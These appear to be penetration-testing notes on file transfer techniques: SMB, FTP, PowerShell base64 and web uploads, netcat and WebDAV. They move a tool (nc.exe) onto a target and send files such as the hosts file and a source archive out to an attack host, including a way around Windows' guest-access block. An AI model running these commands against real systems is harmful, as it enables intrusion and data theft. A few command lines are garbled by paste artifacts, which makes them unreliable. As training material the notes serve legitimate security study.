
### SMB Downloads
The Server Message Block (SMB) protocol, running on TCP/445, is commonly used in Windows-based enterprise networks for file sharing. SMB allows users and applications to transfer files between machines. To download files from a Pwnbox, you can set up an SMB server using Impacket's `smbserver.py`. The basic command to set up the server is:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

You can download files using `copy` on the target machine:

```bash
copy \\192.168.220.133\share\nc.exe
```

Newer versions of Windows block unauthenticated guest access. To bypass this, configure the SMB server with a username and password:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Then, mount the SMB server on the target machine:

```bash
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP Downloads
FTP (TCP/21) is another file transfer method. To set up an FTP server on your attack host, install the `pyftpdlib` Python module:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

To transfer files, you can use the built-in FTP client or PowerShell’s `Net.WebClient`:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

For an interactive shell, create a command file for the FTP client:

```bash
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload Operations
Uploading files from a target machine can be done similarly to downloading, using methods like PowerShell encoding or web-based uploads. For encoding, you can base64 encode a file in PowerShell:

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

On the attack host, decode the file:

```bash
echo <base64_string> | base64 -d > hosts
md5sum hosts
```

For web uploads, use a Python web server configured for file uploads, such as `uploadserver`:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Then, use PowerShell to upload the file:

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

This completes the processes for downloading and uploading files using SMB, FTP, and PowerShell web uploads.

### PowerShell Base64 Web Upload

This method demonstrates how PowerShell can be used to encode a file in Base64 and upload it to a server using `Invoke-WebRequest`. The payload is transmitted as a POST request to a specified URI, and the data is then caught using Netcat. Afterward, the data is decoded back to its original form.

### Step 1: Encoding the File in Base64

First, we convert the contents of a file (`hosts` file in this case) into Base64:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))

```

This command reads the `hosts` file as raw bytes and then converts it into a Base64 string.

### Step 2: Uploading the Encoded File via HTTP

Next, we use `Invoke-WebRequest` to upload the Base64 encoded file to a remote server. The server is assumed to be listening on port 8000:

```powershell
Invoke-WebRequest -Uri <http://192.168.49.128:8000/> -Method POST -Body $b64

```

Here, we send the encoded file as a POST request with the Base64 string as the body.

### Step 3: Catching the Data with Netcat

On the receiving server (listening on port 8000), we use Netcat to catch the incoming Base64 data:

```bash
$ nc -lvnp 8000

```

Netcat listens for connections and displays the incoming data. The Base64-encoded content appears in the console.

### Step 4: Decoding the File

After receiving the Base64-encoded data, we decode it back to its original file using the `base64` tool:

```bash
bash
Copy code
echo <base64> | base64 -d -w 0 > hosts

```

This command takes the Base64 data, decodes it, and writes it back to a file (`hosts`).

---

### SMB Uploads via WebDAV

The next section discusses using **SMB over HTTP** with WebDAV. Many organizations restrict SMB traffic (TCP/445) due to security concerns, but WebDAV provides a workaround by running SMB over HTTP (TCP/80). This method is commonly used for file sharing and remote access.

### Setting Up WebDAV Server

To set up a WebDAV server, we install the necessary Python modules:

```bash
$ sudo pip3 install wsgidav cheroot

```

Then, we run the WebDAV server:

```bash

$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

```

This command runs the WebDAV server on port 80, serving files from `/tmp` with anonymous authentication.

### Connecting to the WebDAV Share

Once the WebDAV server is set up, we can access it from a Windows machine using the `DavWWWRoot` folder:

```powershell
dir \\\\192.168.49.128\\DavWWWRoot

```

This command lists the files available on the WebDAV server.

### Uploading Files via WebDAV

To upload a file (e.g., `SourceCode.zip`) to the WebDAV share, we use the `copy` command:

```powershell
C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.128\\DavWWWRoot\\

```

This uploads the specified file to the WebDAV share, allowing for easy file transfer over HTTP.

---

### FTP Uploads

FTP (File Transfer Protocol) is another method for uploading files. In this section, we discuss how to set up an FTP server using Python's `pyftpdlib` module and how to use PowerShell or command line tools to upload files to it.

### Setting Up the FTP Server

We start the FTP server with the `--write` flag to allow uploading:

```bash
$ sudo python3 -m pyftpdlib --port 21 --write

```

This starts the FTP server on port 21, with write permissions for anonymous users.

### Uploading Files via PowerShell

Using PowerShell, we can upload a file to the FTP server with the following command:

```powershell
(New-Object Net.WebClient).UploadFile('<ftp://192.168.49.128/ftp-hosts>', 'C:\\Windows\\System32\\drivers\\etc\\hosts')

```

This command uploads the `hosts` file to the specified FTP server.

### Creating an FTP Command File

Alternatively, you can create an FTP command file (`ftpcommand.txt`) to automate the file upload process:

```powershell
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

```

This script automates logging in, setting the transfer mode to binary, uploading the file, and closing the connection.

---

### Recap

This section highlighted multiple methods to upload files using native tools such as PowerShell, FTP, and WebDAV. Each method allows file transfer under different network configurations, offering flexibility in various penetration testing scenarios.